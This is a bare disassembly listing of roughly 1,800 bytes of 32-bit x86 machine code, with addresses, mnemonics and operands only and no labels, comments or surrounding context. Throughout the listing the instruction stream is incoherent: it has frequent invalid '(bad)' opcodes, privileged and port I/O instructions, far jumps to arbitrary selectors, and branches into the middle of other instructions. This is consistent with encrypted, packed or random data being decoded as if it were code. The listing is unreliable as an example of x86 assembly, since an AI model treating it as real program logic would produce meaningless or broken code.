  405198:	test   ebx,esp
  40519a:	add    edx,DWORD PTR [ebp+0x6e1a75d7]
  4051a0:	adc    eax,0xbbd972b8
  4051a5:	aad    0x75
  4051a7:	xlat   BYTE PTR ds:[ebx]
  4051a8:	push   ebx
  4051a9:	aad    0xf5
  4051ab:	aaa    
  4051ac:	push   esp
  4051ad:	jne    0x4051f9
  4051af:	retf   
  4051b0:	fs pop ebx
  4051b2:	mov    dh,0x41
  4051b4:	je     0x4051ea
  4051b6:	and    DWORD PTR [ecx],ebp
  4051b8:	xchg   esi,eax
  4051b9:	shl    DWORD PTR [ebx],cl
  4051bb:	cwde   
  4051bc:	pop    ebx
  4051bd:	pop    es
  4051be:	ins    BYTE PTR es:[edi],dx
  4051bf:	dec    eax
  4051c0:	fst    QWORD PTR [edi+0x4611f372]
  4051c6:	in     al,dx
  4051c7:	mov    ah,0x52
  4051c9:	xchg   edx,eax
  4051ca:	adc    edi,DWORD PTR [ebp-0x11]
  4051cd:	shl    ch,0x92
  4051d0:	std    
  4051d1:	xchg   esi,eax
  4051d2:	ret    
  4051d3:	jo     0x4051ee
  4051d5:	ror    BYTE PTR [ebx],cl
  4051d7:	dec    edx
  4051d8:	cmp    esp,ecx
  4051da:	jge    0x405194
  4051dc:	xor    al,ch
  4051de:	fs sti 
  4051e0:	push   es
  4051e1:	scas   al,BYTE PTR es:[edi]
  4051e2:	adc    dh,BYTE PTR [ebx+0x3a]
  4051e5:	xchg   DWORD PTR [edi+edi*1],ecx
  4051e8:	dec    esi
  4051e9:	pop    ds
  4051ea:	imul   esi,DWORD PTR [ebx+ecx*2+0x50],0x10
  4051ef:	nop
  4051f0:	shl    edi,0x4b
  4051f3:	mov    ebx,0x7acb039c
  4051f8:	je     0x405257
  4051fa:	int    0xe5
  4051fc:	dec    edi
  4051fd:	push   ss
  4051fe:	cwde   
  4051ff:	das    
  405200:	dec    edx
  405201:	jmp    0x405282
  405203:	call   0x4b780ce5
  405208:	shl    BYTE PTR [eax],1
  40520a:	and    edi,ebp
  40520c:	sub    ebx,DWORD PTR [eax-0x78]
  40520f:	mov    edx,ebx
  405211:	arpl   WORD PTR ds:0x51dfc3cc,cx
  405217:	cli    
  405218:	push   ss
  405219:	ds add ecx,ebp
  40521c:	data16 sbb BYTE PTR [ebx+0x21],ah
  405220:	cwde   
  405221:	sub    dl,BYTE PTR [ecx+0x14]
  405224:	in     al,0x61
  405226:	add    eax,0xb34f7a3d
  40522b:	lods   eax,DWORD PTR ds:[esi]
  40522c:	jbe    0x4051ed
  40522e:	add    eax,DWORD PTR [edx+0x788e5d20]
  405234:	push   ebp
  405235:	pop    ss
  405236:	xor    eax,0x8ddcf224
  40523b:	push   esp
  40523c:	jae    0x405238
  40523e:	pop    esp
  40523f:	sub    esi,DWORD PTR [esi-0x3a]
  405242:	adc    al,0xf
  405244:	aaa    
  405245:	mov    cl,0xb9
  405247:	mov    ebp,0xae51801
  40524c:	inc    eax
  40524d:	test   eax,0x1641fac8
  405252:	jno    0x405293
  405254:	mov    eax,ds:0x40fb2b78
  405259:	dec    eax
  40525a:	repnz mov eax,0x459770bd
  405260:	sbb    eax,0xa1c5aee5
  405265:	push   edx
  405266:	inc    ecx
  405267:	ret    0xda4
  40526a:	push   edx
  40526b:	or     BYTE PTR [ebx],cl
  40526d:	add    al,0x24
  40526f:	push   ecx
  405270:	ins    BYTE PTR es:[edi],dx
  405271:	arpl   WORD PTR [ecx+0x1a0b7e14],dx
  405277:	not    BYTE PTR [esi]
  405279:	ss jg  0x4052dc
  40527c:	jg     0x4052a6
  40527e:	loope  0x405262
  405280:	push   0x83a853fa
  405285:	mov    eax,0x2727b52a
  40528a:	add    ch,dh
  40528c:	push   esi
  40528d:	addr16 push ds
  40528f:	test   BYTE PTR [ecx],ah
  405291:	fwait
  405292:	mov    esp,0xeb7f1c45
  405297:	ins    BYTE PTR es:[edi],dx
  405298:	mov    dh,0xcc
  40529a:	cmc    
  40529b:	scas   al,BYTE PTR es:[edi]
  40529c:	jmp    0x4ff9:0xa728d54b
  4052a3:	xchg   edx,eax
  4052a4:	push   eax
  4052a5:	cwde   
  4052a6:	or     al,0xa3
  4052a8:	out    dx,eax
  4052a9:	lods   al,BYTE PTR ds:[esi]
  4052aa:	retf   0x3cfa
  4052ad:	dec    edx
  4052ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052af:	cmp    bl,BYTE PTR [ebx-0x57]
  4052b2:	imul   esp,edi,0xdbc67936
  4052b8:	or     ebx,DWORD PTR [ebp+0x34]
  4052bb:	stos   DWORD PTR es:[edi],eax
  4052bc:	sub    DWORD PTR [edx+0x21],esp
  4052bf:	fwait
  4052c0:	pop    ebx
  4052c1:	pop    esi
  4052c2:	sub    DWORD PTR [esi+0x67],ebp
  4052c5:	jne    0x4052fd
  4052c7:	cmp    DWORD PTR [ecx],eax
  4052c9:	ret    
  4052ca:	sub    DWORD PTR [ebx+ebx*2],0x19348a8a
  4052d1:	daa    
  4052d2:	jb     0x4052c2
  4052d4:	scas   al,BYTE PTR es:[edi]
  4052d5:	mov    esi,fs
  4052d7:	ds int 0x51
  4052da:	push   ecx
  4052db:	dec    ebx
  4052dc:	jns    0x40525f
  4052de:	loop   0x4052d4
  4052e0:	out    dx,eax
  4052e1:	shl    DWORD PTR [edx+0x574f6457],cl
  4052e7:	aaa    
  4052e8:	add    BYTE PTR ds:0x31ccd75,dl
  4052ee:	sbb    eax,0x9f747a81
  4052f3:	lods   al,BYTE PTR ds:[esi]
  4052f4:	nop
  4052f5:	jge    0x405372
  4052f7:	sbb    al,0x46
  4052f9:	stos   DWORD PTR es:[edi],eax
  4052fa:	cmp    BYTE PTR [edi+0x6d88af60],al
  405300:	(bad)
  405304:	pop    ebx
  405305:	mov    DWORD PTR [esi+0x4d],edi
  405308:	in     eax,0x75
  40530a:	out    dx,al
  40530b:	adc    edi,0x60
  40530e:	ins    BYTE PTR es:[edi],dx
  40530f:	jp     0x405357
  405311:	jp     0x4052a3
  405313:	jecxz  0x4052f4
  405315:	clc    
  405316:	adc    DWORD PTR [ecx+0x3bc9bc84],edi
  40531c:	rcl    DWORD PTR [edx],0xad
  40531f:	pop    esp
  405320:	inc    ebx
  405321:	stc    
  405322:	pop    ebp
  405323:	jns    0x4052e8
  405325:	in     eax,0xe7
  405327:	sbb    eax,0xf8ec5282
  40532c:	mov    bh,0xd4
  40532e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40532f:	jl     0x40533d
  405331:	cld    
  405332:	or     eax,0xf958fb2d
  405337:	mov    cl,0xa2
  405339:	pop    ds
  40533a:	int    0x6b
  40533c:	cwde   
  40533d:	call   0x144c7c14
  405342:	push   0x75b390
  405347:	retf   0xc40e
  40534a:	(bad)
  40534e:	cli    
  40534f:	add    eax,0x2faf1a9a
  405354:	xchg   BYTE PTR [ecx],cl
  405356:	xor    eax,0x69b9ba5
  40535b:	fldenv [edx]
  40535d:	in     eax,0xf9
  40535f:	pop    ss
  405360:	jno    0x405351
  405362:	xchg   edi,eax
  405363:	js     0x405375
  405365:	popa   
  405366:	push   ebx
  405368:	repnz into 
  40536a:	loope  0x4052ec
  40536c:	test   eax,0x1e7b64e4
  405371:	jmp    0x7e96:0xe371e419
  405378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405379:	sbb    dl,BYTE PTR [ebp-0x6effd1f6]
  40537f:	imul   esp,DWORD PTR [ebx],0xfffffff4
  405382:	ficomp DWORD PTR [eax-0x60]
  405385:	mov    ah,BYTE PTR [eax+ebx*1]
  405388:	int    0xd2
  40538a:	(bad)  
  40538b:	mov    gs,WORD PTR [eax+edx*1]
  40538e:	mov    esp,0x9d3b16cf
  405393:	inc    edi
  405394:	shl    eax,1
  405396:	mov    esi,0x2b7d46ca
  40539b:	add    DWORD PTR [ebx+eiz*2],esi
  40539e:	inc    edx
  40539f:	in     al,0xad
  4053a1:	pop    es
  4053a2:	aad    0x11
  4053a4:	xor    esi,DWORD PTR [edx-0xe3db97b]
  4053aa:	lds    esi,FWORD PTR [ebp+0x23d38503]
  4053b0:	popa   
  4053b1:	leave  
  4053b2:	rcl    al,0xe0
  4053b5:	mov    bl,0x9b
  4053b7:	cld    
  4053b8:	inc    eax
  4053b9:	and    dl,BYTE PTR [ecx-0x7]
  4053bc:	xchg   edi,eax
  4053bd:	xlat   BYTE PTR ds:[ebx]
  4053be:	lahf   
  4053bf:	xchg   DWORD PTR [edx],edi
  4053c1:	cwde   
  4053c2:	sub    eax,0xf4c19218
  4053c7:	add    ebx,edx
  4053c9:	(bad)  
  4053ca:	hlt    
  4053cb:	imul   esp,DWORD PTR [edx+esi*4+0x68],0xfffffff3
  4053d0:	sbb    eax,0x5625def4
  4053d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053d6:	cmp    BYTE PTR [ebp+0x28a75d0e],bh
  4053dc:	cmp    BYTE PTR [ecx-0x56],0xbb
  4053e0:	data16 test ch,ah
  4053e3:	and    edx,ebp
  4053e5:	ja     0x405462
  4053e7:	ss inc ebx
  4053e9:	jmp    0x4053be
  4053eb:	push   ebp
  4053ec:	sub    esp,DWORD PTR [ecx+0x3b]
  4053ef:	icebp  
  4053f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f1:	test   BYTE PTR [edi+0x39],cl
  4053f4:	popa   
  4053f5:	mov    dl,0xd1
  4053f7:	sar    BYTE PTR [ebx+0xf],0xb3
  4053fb:	cmp    BYTE PTR [edx-0x34a5e7f0],al
  405401:	js     0x4053cb
  405403:	sub    esi,DWORD PTR [esi+ecx*4-0x3d]
  405407:	(bad)  
  405408:	in     eax,dx
  405409:	add    ebp,edx
  40540b:	popa   
  40540c:	add    BYTE PTR [eax+0x57],ah
  40540f:	ds push cs
  405411:	adc    BYTE PTR [esi-0x33d16206],dh
  405417:	retf   
  405418:	mov    eax,0x6fd63a29
  40541d:	mov    ds:0x23269dea,al
  405422:	popa   
  405423:	push   ebx
  405424:	ja     0x405430
  405426:	ss aaa 
  405428:	dec    esp
  405429:	outs   dx,BYTE PTR ds:[esi]
  40542a:	cmp    cl,cl
  40542c:	add    ah,BYTE PTR [edi+0x1177ab17]
  405432:	adc    BYTE PTR [ecx-0x15a40200],cl
  405438:	and    eax,0x52402949
  40543d:	test   al,0x8
  40543f:	add    esp,edi
  405441:	adc    BYTE PTR [ebx+0x69310348],0x4c
  405448:	nop
  405449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40544a:	js     0x4054a5
  40544c:	fnstenv [edx]
  40544e:	scas   al,BYTE PTR es:[edi]
  40544f:	inc    esi
  405450:	ffreep st(0)
  405452:	mov    ah,ch
  405454:	test   DWORD PTR [edi],0x714ce6b8
  40545a:	mov    cl,0x19
  40545c:	and    DWORD PTR [ebp-0x6a41ed5a],ecx
  405462:	sub    al,BYTE PTR ds:[esi-0x145494b2]
  405469:	sti    
  40546a:	pop    ds
  40546b:	push   0x48
  40546d:	daa    
  40546e:	xor    DWORD PTR [eax+0x66],esp
  405471:	xchg   ebx,eax
  405472:	sub    eax,0xc30dfe0f
  405477:	and    al,0xca
  405479:	icebp  
  40547a:	pusha  
  40547b:	mov    eax,0x7c7b58a4
  405480:	or     cl,BYTE PTR [ebx]
  405482:	into   
  405483:	icebp  
  405484:	in     al,0x9e
  405486:	popa   
  405487:	inc    esp
  405488:	mov    ebx,0xcbf20664
  40548d:	sub    DWORD PTR gs:[ebx+0x5d0e56b7],edi
  405494:	push   ecx
  405495:	jae    0x4054bf
  405497:	add    ah,BYTE PTR [edi-0x77c8715f]
  40549d:	and    ebp,ecx
  40549f:	rol    bh,0xd2
  4054a2:	mov    esp,0x5c9a3741
  4054a7:	test   eax,0x6a27b369
  4054ac:	out    0x9f,eax
  4054ae:	leave  
  4054af:	cs pop edi
  4054b1:	sbb    ch,BYTE PTR [esi+0x4]
  4054b4:	pop    esi
  4054b5:	inc    edx
  4054b6:	stos   BYTE PTR es:[edi],al
  4054b7:	mov    edx,0xd0593388
  4054bc:	xor    esi,edi
  4054be:	pop    edx
  4054bf:	imul   eax,edx,0x97b01ca5
  4054c5:	xor    eax,0x9f41c185
  4054ca:	sub    al,0x24
  4054cc:	jnp    0x405522
  4054ce:	mov    eax,cs
  4054d0:	es jno 0x405527
  4054d3:	xchg   esp,eax
  4054d4:	pop    ds
  4054d5:	cld    
  4054d6:	ret    0x31c2
  4054d9:	or     BYTE PTR [esi-0x7c],ch
  4054dc:	jnp    0x405466
  4054de:	push   ebp
  4054df:	push   ds
  4054e0:	sar    DWORD PTR [eax-0x7f97be07],1
  4054e6:	adc    DWORD PTR [ebx+0x4d64a18c],esp
  4054ec:	and    al,0xa1
  4054ee:	and    eax,edi
  4054f0:	sub    eax,0xab96eeb4
  4054f5:	cmp    esp,DWORD PTR [esi]
  4054f7:	hlt    
  4054f8:	in     eax,dx
  4054f9:	pop    ecx
  4054fa:	js     0x405546
  4054fc:	arpl   bx,cx
  4054fe:	jns    0x405507
  405500:	mov    bh,0xf0
  405502:	and    al,0x60
  405504:	jmp    0x4054b1
  405506:	leave  
  405507:	addr16 dec edx
  405509:	cld    
  40550a:	xchg   esp,eax
  40550b:	mov    dh,0xdb
  40550d:	sub    DWORD PTR [edi],eax
  40550f:	shl    DWORD PTR [eax-0x47b5b9d1],1
  405515:	popf   
  405516:	shl    DWORD PTR [ebp+0x708ed7b0],1
  40551c:	cwde   
  40551d:	dec    ebp
  40551e:	in     al,0x56
  405520:	xchg   ebx,eax
  405521:	xchg   edx,eax
  405522:	cmp    BYTE PTR [ebx+0x60],0x4e
  405526:	outs   dx,BYTE PTR ds:[esi]
  405527:	xchg   esp,eax
  405528:	jo     0x40558c
  40552a:	push   esp
  40552b:	out    dx,eax
  40552c:	test   BYTE PTR [ebx],dl
  40552e:	in     eax,dx
  40552f:	cdq    
  405530:	cld    
  405531:	pushf  
  405532:	scas   al,BYTE PTR es:[edi]
  405533:	in     al,0xff
  405535:	inc    esi
  405536:	jne    0x40550b
  405538:	mov    ah,0xd4
  40553a:	jmp    0x4054c0
  40553c:	add    eax,DWORD PTR ds:0x5f7df7b5
  405542:	mov    ds:0x5c8e80e8,al
  405547:	addr16 aaa 
  405549:	stos   DWORD PTR es:[edi],eax
  40554a:	cld    
  40554b:	xor    ebp,DWORD PTR [eax-0x33cb11b0]
  405551:	clc    
  405552:	bound  esi,QWORD PTR [ebp+0x0]
  405555:	jo     0x4055b4
  405557:	test   BYTE PTR [edi-0x6e4e3877],dl
  40555d:	sub    esi,0xffffff99
  405560:	pop    edx
  405561:	mov    esi,ds
  405563:	push   edi
  405564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405565:	iret   
  405566:	jae    0x4055c1
  405568:	jb     0x405520
  40556a:	mov    ebp,0xfddb1192
  40556f:	push   cs
  405570:	push   esi
  405571:	mov    edx,0xa1d0bd78
  405576:	mov    ch,0x7f
  405578:	xchg   esi,eax
  405579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40557a:	aad    0x37
  40557c:	cld    
  40557d:	lahf   
  40557e:	adc    BYTE PTR [ebp+0x79],ah
  405581:	push   edi
  405582:	adc    al,0xe0
  405584:	xor    al,0x55
  405586:	popa   
  405587:	jge    0x4055d7
  405589:	cld    
  40558a:	int    0x52
  40558c:	mov    ebp,0xa558f385
  405591:	pusha  
  405592:	inc    ecx
  405593:	inc    edi
  405594:	jno    0x405612
  405596:	push   es
  405597:	pop    eax
  405598:	sbb    esp,DWORD PTR [ecx-0x1926eabc]
  40559e:	out    dx,al
  40559f:	iret   
  4055a0:	xor    al,BYTE PTR [esi-0x9]
  4055a3:	arpl   dx,sp
  4055a5:	xchg   esp,eax
  4055a6:	mov    bl,BYTE PTR [edx-0x47063972]
  4055ac:	pop    esp
  4055ad:	cmp    eax,DWORD PTR [ebx-0x77]
  4055b0:	ds inc eax
  4055b2:	test   dh,dh
  4055b4:	mov    DWORD PTR [ecx-0x6bbbd7c1],ebx
  4055ba:	push   esp
  4055bb:	daa    
  4055bc:	dec    esp
  4055bd:	loopne 0x405576
  4055bf:	push   ebp
  4055c0:	(bad)  
  4055c1:	test   DWORD PTR [ebx],0xeb9b7cc9
  4055c7:	sbb    DWORD PTR [eax+0x62589d82],esi
  4055cd:	cwde   
  4055ce:	js     0x405624
  4055d0:	mov    esp,DWORD PTR [edi]
  4055d2:	ins    BYTE PTR es:[edi],dx
  4055d3:	ja     0x405556
  4055d5:	xor    dl,BYTE PTR ds:0xf590cd7c
  4055db:	outs   dx,DWORD PTR ds:[esi]
  4055dc:	mov    ch,0x50
  4055de:	jle    0x4055c5
  4055e0:	push   ecx
  4055e1:	sub    eax,0xbb32f2e3
  4055e6:	aam    0xed
  4055e8:	sub    esi,DWORD PTR [ecx-0x80]
  4055eb:	out    0xfc,al
  4055ed:	test   BYTE PTR [ecx-0x61f05552],dl
  4055f3:	jle    0x405622
  4055f5:	pusha  
  4055f6:	adc    al,0x1
  4055f8:	add    al,0x81
  4055fa:	in     al,dx
  4055fb:	in     eax,0xdc
  4055fd:	(bad)  
  4055fe:	push   esi
  4055ff:	rcr    DWORD PTR [ebx+0x10],0xc7
  405603:	clc    
  405604:	inc    esp
  405605:	sti    
  405606:	push   0xe9b26bac
  40560b:	cdq    
  40560c:	and    DWORD PTR [esi+0x76dc3cba],ecx
  405612:	lock ret 0xc75b
  405616:	inc    esi
  405617:	pop    es
  405618:	sbb    DWORD PTR [ebx+esi*1-0x50ec4982],eax
  40561f:	repnz (bad)
  405622:	or     eax,0xa450de0c
  405627:	adc    edi,DWORD PTR [esi-0x57]
  40562a:	sbb    al,0x3d
  40562c:	fist   DWORD PTR [esi-0x2fb7931b]
  405632:	(bad)  
  405633:	loope  0x4055c9
  405635:	or     ebx,DWORD PTR [ebx]
  405637:	repnz xor eax,esp
  40563a:	mov    cl,0x18
  40563c:	arpl   WORD PTR [edi+0x68771f81],si
  405642:	adc    eax,0x850671bd
  405647:	(bad)  
  405648:	adc    eax,0xace295d
  40564d:	or     BYTE PTR fs:[eax-0x68f66829],dl
  405654:	scas   al,BYTE PTR es:[edi]
  405655:	lea    esp,[esi+edi*8]
  405658:	cmc    
  405659:	mov    edx,0xc6706fae
  40565e:	fnstsw WORD PTR [edx]
  405660:	sub    BYTE PTR [eax-0x1a85ea01],bl
  405666:	jb     0x40562a
  405668:	hlt    
  405669:	lock xchg edx,eax
  40566b:	bound  ecx,QWORD PTR [eax]
  40566d:	out    dx,eax
  40566e:	ds fxch st(1)
  405671:	aaa    
  405672:	add    esi,DWORD PTR [edi-0x54]
  405675:	bound  esp,QWORD PTR [eax-0x6965aa6c]
  40567b:	imul   eax,DWORD PTR [ecx],0x66683f61
  405681:	mov    ah,bh
  405683:	and    dh,BYTE PTR [edx+0x5f]
  405686:	and    al,BYTE PTR [ebx]
  405688:	mov    BYTE PTR [edx-0x5d3c8bd],0x2e
  40568f:	cmp    BYTE PTR [edi-0x9],0x29
  405693:	dec    esp
  405694:	out    0xb0,al
  405696:	je     0x405674
  405698:	dec    esi
  405699:	ss ins BYTE PTR es:[edi],dx
  40569b:	or     dh,BYTE PTR [edi-0x666f58cd]
  4056a1:	pusha  
  4056a2:	adc    eax,0xb6ababa
  4056a7:	scas   al,BYTE PTR es:[edi]
  4056a8:	mov    bh,0xa8
  4056aa:	shl    DWORD PTR [eax+edx*2],0x64
  4056ae:	sbb    ebx,DWORD PTR [ebp+0x43aaaad9]
  4056b4:	cwde   
  4056b5:	(bad)  
  4056b6:	outs   dx,DWORD PTR ds:[esi]
  4056b7:	ds es mov ebx,0x9c34c76a
  4056be:	icebp  
  4056bf:	fisub  WORD PTR [edi]
  4056c1:	push   ebp
  4056c2:	js     0x405725
  4056c4:	sti    
  4056c5:	xchg   esp,eax
  4056c6:	cwde   
  4056c7:	dec    edi
  4056c8:	data16 daa 
  4056ca:	pop    esp
  4056cb:	arpl   WORD PTR [edx-0x3b08c6c6],si
  4056d1:	cli    
  4056d2:	mov    bh,0x80
  4056d4:	mov    al,ds:0x4e3d7bce
  4056d9:	shr    DWORD PTR [edi-0x75],cl
  4056dc:	ror    DWORD PTR [esi+0x1846fe4b],0x1a
  4056e3:	repnz pop esp
  4056e5:	test   eax,0x39bac9ba
  4056ea:	enter  0x20c6,0x88
  4056ee:	jp     0x405752
  4056f0:	lds    esp,FWORD PTR [ecx-0x3c]
  4056f3:	xchg   ebp,eax
  4056f4:	test   BYTE PTR [ebp-0x55921238],cl
  4056fa:	jb     0x40570c
  4056fc:	xchg   DWORD PTR [edi+0x1f1872f1],esp
  405702:	jge    0x405771
  405704:	add    eax,0xf224d419
  405709:	bound  esi,QWORD PTR ds:0xbacdcec7
  40570f:	bound  edi,QWORD PTR [edx+0x37]
  405712:	js     0x405727
  405714:	jmp    0x40571a
  405716:	outs   dx,BYTE PTR ds:[esi]
  405717:	pop    ds
  405718:	push   edx
  405719:	xor    BYTE PTR [edi-0x1958d1ee],dh
  40571f:	not    BYTE PTR [esi-0x1]
  405722:	xor    DWORD PTR [edx-0x48d19b01],eax
  405728:	out    0x85,al
  40572a:	inc    esi
  40572b:	in     eax,dx
  40572c:	push   cs
  40572d:	mov    esi,0xfa64cc2b
  405732:	imul   edi,DWORD PTR [esi+edx*8-0x58cedc9c],0x73
  40573a:	mov    ds:0xb564595f,eax
  40573f:	mov    ebp,0x24aee591
  405744:	sub    esp,DWORD PTR [edi+0x38]
  405747:	add    esp,DWORD PTR [esi+eiz*1]
  40574a:	fcmovne st,st(3)
  40574c:	aad    0x32
  40574e:	jge    0x405783
  405750:	nop
  405751:	in     eax,0x99
  405753:	retf   0x7d44
  405756:	test   bl,ah
  405758:	inc    esi
  405759:	jle    0x405718
  40575b:	cmp    esi,DWORD PTR [eax+0x142f1d79]
  405761:	sub    DWORD PTR [ecx-0xe],edi
  405764:	xor    BYTE PTR [eax],dl
  405766:	arpl   WORD PTR [edi+0x63c489e0],bp
  40576c:	cs mov eax,0xbaf8e210
  405772:	mov    BYTE PTR [ecx+0x45],dh
  405775:	xor    DWORD PTR [ecx],edx
  405777:	mov    ah,0x7c
  405779:	mov    ch,0xa6
  40577b:	ret    0x69f4
  40577e:	cmp    cl,ah
  405780:	push   0xdf601e90
  405785:	cmp    DWORD PTR [ecx+0x5b9d586a],esi
  40578b:	nop
  40578c:	ins    BYTE PTR es:[edi],dx
  40578d:	sbb    esi,edi
  40578f:	cwde   
  405790:	(bad)  
  405791:	adc    DWORD PTR [eax+0x499e4c37],esp
  405797:	(bad)  
  405798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405799:	retf   
  40579a:	data16 shl BYTE PTR [edx+0x7e],cl
  40579e:	js     0x4057c6
  4057a0:	or     esp,DWORD PTR [eax+ecx*2]
  4057a3:	mov    ah,0xda
  4057a5:	stos   BYTE PTR es:[edi],al
  4057a6:	loope  0x40577e
  4057a8:	mov    BYTE PTR [edx-0x5d],al
  4057ab:	fisubr WORD PTR [eax+0xf20a393]
  4057b1:	iret   
  4057b2:	cmp    al,0xfe
  4057b4:	adc    al,0x86
  4057b6:	xchg   edx,eax
  4057b7:	ss dec esi
  4057b9:	sbb    DWORD PTR [eax],esi
  4057bb:	and    BYTE PTR [edi],0xb3
  4057be:	loope  0x4057f3
  4057c0:	iret   
  4057c1:	jo     0x4057b8
  4057c3:	add    cl,bh
  4057c5:	sub    BYTE PTR ds:0x93cb0ad6,dl
  4057cb:	dec    edx
  4057cc:	rol    BYTE PTR [ebx+0x3d],cl
  4057cf:	pop    edx
  4057d0:	fst    DWORD PTR [eax-0x7d]
  4057d3:	nop
  4057d4:	inc    edx
  4057d5:	ss push cs
  4057d7:	jmp    0x405779
  4057d9:	mov    ch,0x87
  4057db:	dec    eax
  4057dc:	call   0xc9bbe95e
  4057e1:	mov    ds:0xe3c2e54,al
  4057e6:	gs cmp ebx,DWORD PTR fs:[ebp+0x44beab23]
  4057ee:	stc    
  4057ef:	sar    DWORD PTR [ebx],0xcb
  4057f2:	push   ecx
  4057f3:	cmc    
  4057f4:	mov    bl,0x41
  4057f6:	or     edi,DWORD PTR [ecx]
  4057f8:	push   es
  4057f9:	inc    esi
  4057fa:	jge    0x405833
  4057fc:	je     0x40579b
  4057fe:	cmp    BYTE PTR [esi],dl
  405800:	in     eax,dx
  405801:	pop    ebx
  405802:	outs   dx,BYTE PTR ds:[esi]
  405803:	repz clc 
  405805:	aaa    
  405806:	pop    esi
  405807:	test   BYTE PTR [ecx+ecx*8],al
  40580a:	or     dh,al
  40580c:	mov    edx,0x5f31ba38
  405811:	and    eax,0x1167679
  405816:	loope  0x40586f
  405818:	js     0x4057c1
  40581a:	push   ebp
  40581b:	mov    al,0x49
  40581d:	aad    0x56
  40581f:	retf   
  405820:	or     cl,BYTE PTR [edx]
  405822:	ret    
  405823:	mov    bh,0x1b
  405825:	mov    bl,0x80
  405827:	xchg   edi,eax
  405828:	outs   dx,BYTE PTR ds:[esi]
  405829:	sub    ax,0xa2ce
  40582d:	mov    esi,0x1df0422f
  405832:	push   edi
  405833:	mov    ch,0x3e
  405835:	sahf   
  405836:	jmp    0x4be4f12b
  40583b:	in     al,dx
  40583c:	imul   edx,DWORD PTR [edi],0x7d38bec4
  405842:	(bad)  
  405844:	outs   dx,DWORD PTR ds:[esi]
  405845:	cld    
  405846:	and    esp,DWORD PTR [edi]
  405848:	fstp   QWORD PTR [eax-0x3d]
  40584b:	shr    bh,1
  40584d:	inc    edx
  40584e:	sbb    al,0xc3
  405850:	mov    dl,0x2
  405852:	test   al,0x51
  405854:	lods   al,BYTE PTR ds:[esi]
  405855:	shl    BYTE PTR [edx-0x74e5df17],cl
  40585b:	test   edi,edx
  40585d:	lock mov bh,0x78
  405860:	fcomp  DWORD PTR [eax-0x3c]
  405863:	rol    BYTE PTR [esi+0x6760b9b2],1
  405869:	inc    esi
  40586a:	pop    edi
  40586b:	les    edx,FWORD PTR [ebx]
  40586d:	fcomp  QWORD PTR [edx+0x46c4acf7]
  405873:	inc    ebp
  405874:	test   BYTE PTR [ebx+0x3],ah
  405877:	sub    al,bh
  405879:	lahf   
  40587a:	mov    ecx,DWORD PTR [ebp-0x67]
  40587d:	rcr    DWORD PTR [ebx],0x45
  405880:	mov    ah,0x7c
  405882:	js     0x4058d2
  405884:	loope  0x4058bc
  405886:	dec    edi
  405887:	outs   dx,BYTE PTR ds:[esi]
  405888:	ret    
  405889:	jbe    0x40586d
  40588b:	test   eax,0x9ee32706
  405890:	lods   al,BYTE PTR ss:[esi]
  405892:	inc    ebp
  405893:	cmp    BYTE PTR [edi+ebx*2+0x41],bl
  405897:	sahf   
  405898:	ret    
  405899:	xchg   ecx,eax
  40589a:	loope  0x4058cd
  40589c:	std    
  40589d:	and    al,0xa2
  40589f:	and    dl,dh
  4058a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a2:	jg     0x40583a
  4058a4:	popf   
  4058a5:	pop    ebp
  4058a6:	adc    cl,BYTE PTR [esi*8-0x55631f]
  4058ad:	enter  0xcb1f,0xa2
  4058b1:	or     ebp,esi
  4058b3:	call   0x6af0404a
  4058b8:	std    
  4058b9:	cmp    BYTE PTR [esi],bl
  4058bb:	inc    edx
  4058bc:	and    esp,eax
  4058be:	cwde   
  4058bf:	les    edx,FWORD PTR [ecx]
  4058c1:	div    DWORD PTR [eax]
  4058c3:	push   esi
  4058c4:	clc    
  4058c5:	loopne 0x4058ee
  4058c7:	pop    ss
  4058c8:	jns    0x405908
  4058ca:	pop    DWORD PTR [edi-0x33154bc5]
  4058d0:	lods   al,BYTE PTR ds:[esi]
  4058d1:	imul   ebx,esi,0xffffff93
  4058d4:	jb     0x4058bd
  4058d6:	jae    0x405914
  4058d8:	add    eax,0xb1f0f8b8
  4058dd:	jecxz  0x40589c
  4058df:	idiv   BYTE PTR [esi+0x7e]
  4058e2:	lea    eax,[edi+0x4d]
  4058e5:	cwde   
  4058e6:	xor    al,0x63
  4058e8:	aam    0x4e
  4058ea:	fidiv  DWORD PTR [esi-0x66222b3c]
  4058f0:	es data16 mov bh,0xe2
  4058f4:	pusha  
  4058f5:	cld    
  4058f6:	test   al,0xa
  4058f8:	pop    edi
  4058f9:	pop    ebp
  4058fa:	push   ebp
  4058fb:	aas    
  4058fc:	inc    esi
  4058fd:	xchg   esi,eax
  4058fe:	nop
  4058ff:	and    edx,ecx
  405901:	mov    edx,0xb5707efc
  405906:	les    edx,FWORD PTR [esi-0x39]
  405909:	dec    esp
  40590a:	ret    
  40590b:	sub    BYTE PTR [ebx-0x69ca83e4],0x1f
  405912:	xor    al,0x9d
  405914:	fidivr DWORD PTR [ebx+0x4da34e1]
  40591a:	nop
  40591b:	imul   ebx,esp,0xd35f0637
  405921:	stos   DWORD PTR es:[edi],eax
  405922:	pop    eax
  405923:	or     DWORD PTR [edi+0x0],eax
  405926:	inc    esp
  405927:	inc    esi
  405928:	sub    al,0x69
  40592a:	outs   dx,DWORD PTR ds:[esi]
  40592b:	adc    DWORD PTR [ecx+0x796bd4fa],ebp
  405931:	mov    ah,0xaf
  405933:	stos   DWORD PTR es:[edi],eax
  405934:	sub    eax,0x1945e709
  405939:	arpl   bx,ax
  40593b:	xchg   bh,al
  40593d:	sbb    dl,cl
  40593f:	call   0x1ffb:0xcdbdc8bf
  405946:	mov    esi,0x8fbd0854
  40594b:	push   0xfffffff7
  40594d:	(bad)  
  40594e:	aaa    
  40594f:	ror    dl,cl
  405951:	pop    edi
  405952:	retf   
  405953:	fucom  st(6)
  405955:	sub    DWORD PTR [edx+0x0],0x44
  405959:	fwait
  40595a:	mov    edx,0xb1299e22
  40595f:	mul    DWORD PTR [edi+0x7a]
  405962:	pop    ss
